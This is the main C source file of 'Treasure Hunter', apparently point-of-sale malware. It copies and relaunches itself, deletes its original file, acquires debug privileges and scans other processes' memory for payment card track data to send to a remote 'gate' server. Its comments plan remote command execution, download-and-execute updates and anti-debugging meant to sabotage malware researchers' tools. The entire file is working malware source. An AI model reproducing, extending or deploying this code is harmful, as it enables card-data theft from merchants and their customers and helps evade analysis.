//#include <vld.h>

#include <windows.h>



/*#define _CRTDBG_MAP_ALLOC
#include <stdlib.h>
#include <crtdbg.h>*/

//#include <wininet.h>
#include <winhttp.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <winioctl.h>
#include "stringFunctions.h"
#include "config.h"
#include "globals.h"
#include "internetConnection.h"
#include "md5.h"
#include "getSysInfo.h"
#include "rc4.h"
#include "pirateCode.h"
#include "sendReport.h"
#include "findTracks.h"
#include "getKeys.h"
#include "procScan.h"
#include "clingfishMode.h"
#include "selfCopyAndExecute.h"

/* Treasure Hunter version 0.1 Alpha
 * Created by Jolly Roger (jollyroger@prv.name)
 * Все комментарии идут на английском, потому что мне было лень переключать раскладку.
 * 
 * This code is written in pure C. No C++ features were used.
 *
 * TO DO for the next version of the client (0.2 Beta):
 * Replace all Unicode versions of functions with ANSI versions. Now why did I ever go for wide-char in the first place?..
 * Improve the code structure:
 * - Replace all the if - else constructs that are rendered needless by return commands;
 * - Organize the includes;
 * - Give the code proper commenting so that I am able to modify and improve it after not having seen it for some time (if such a thing happens).
 * Make scan exceptions and service codes configurable.
 * Add the following commands to the gate communication logic:
 * - Download and execute for updating;
 * - Remote CMD command execution;
 * - Remote self-removal for emergency cases.
 * Add anti-debugging:
 * - Use self-debugging by creating a child process (may be improved later by reversing the tables);
 * - Improve the MD5 function and use it to find debuggers by signatures (maybe to be added in future versions);
 * - Use GetTickCount to detect parts of code being stepped through (maybe to be added in a "heuristical" joint algorithm with the abovementioned);
 * - Upon finding a debugger, destroy the critical section and/or start creating new threads infinitely until the application crashes.
 * - Maybe also kill processes and delete debuggers and/or decompilers permanently. We want the malware researchears screamin'!
 * Add better persistency and timeouts to gate communication.
 * Add local saving of data if the gate can't be reached for a certain period of time.
 * Add the option to run the program as a service on Windows XP.
 * Improve the code structure and add comments to avoid future confusion.
 * Add error handling and backup restart in case of crash or heap overflow (malloc fail).
 * Improve the Clingfish system (so that a clingfish thread doesn't do the same thing as the main thread right after being spawned).
 * Debug the system information extraction mechanism further (on different OS versions).
 * Improve the track-finding algorithm to make it faster.
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
	HANDLE mutex;
	char *cmdParam, *cmdLineDecrypted;
	int i, cmdLineLength, cmdParamStart;

	InitializeCriticalSection(&m_cs);
	systemID = generateSystemID();

	initGlobals();

	showDebugMessage(L"TreasureHunter version 0.1 Alpha, created by Jolly Roger (jollyroger@prv.name) for BearsInc. Greets to Xylitol and co.", 1);
	
	mutex = CreateMutexA(NULL, FALSE, systemID);

	cmdLineLength = strlen(lpCmdLine);
	if (cmdLineLength > 0){ /*if we must delete the original file, do so*/
		cmdParam = (char*)safeMalloc(sizeof(char) * (cmdLineLength + 1));
		for (i=cmdLineLength; i>0 && lpCmdLine[i-1]!=' '; i--);
		cmdParamStart = i;
		for (i=0; i<cmdLineLength-cmdParamStart; i++)
			cmdParam[i] = lpCmdLine[cmdParamStart + i];
		cmdParam[i] = '\0';

		cmdLineDecrypted = rc4(firstEncKey, (unsigned char*)cmdParam, 1, 0);
		if (DeleteFileA(cmdLineDecrypted) <= 0){
			showDebugMessage(L"Failed to delete original file, retrying", 0);
			MessageBoxA(NULL, cmdLineDecrypted, "cmdLineDecrypted", MB_OK);
			while (DeleteFileA(cmdLineDecrypted) <= 0);
			showDebugMessage(L"Successfully deleted original file", 0);
		} else {
			showDebugMessage(L"Successfully deleted original file", 0);
		}
	} else if (selfCopyAndExecute(mutex, systemID) != 2){/*if we have already copied ourselves or an error occured, die*/
		ReleaseMutex(mutex);
		CloseHandle(mutex);
		return 0;
	}

	if (getDebugPrivileges() == 0) /*get debug privileges to open handles to processes run by another user*/
		showDebugMessage(L"Couldn't get debug privileges", 0);

	tracksArr = (dumpsHolder*)safeMalloc(sizeof(dumpsHolder) * tracksArrSize);
	for (i=0; i<tracksArrSize; i++){
		tracksArr[i].lpFileName = (TCHAR*)safeMalloc(sizeof(TCHAR) * (MAX_PATH + 1));
		tracksArr[i].lpFileNameLength = 0;
		tracksArr[i].procID = 0;
		tracksArr[i].trackArr = (char*)safeMalloc(sizeof(char) * 83); //an approximation of the maximum track length
		tracksArr[i].trackArrLength = 82;
	}

	if (getKeys() && initConnection(&hSession, &hConnect, userAgentReport, gateDomain)){
		showDebugMessage(L"Successfully reached the gate", 0);
		scanProcs();
	} else
		showDebugMessage(L"Failed to reach the gate", 0);

    return 0;
}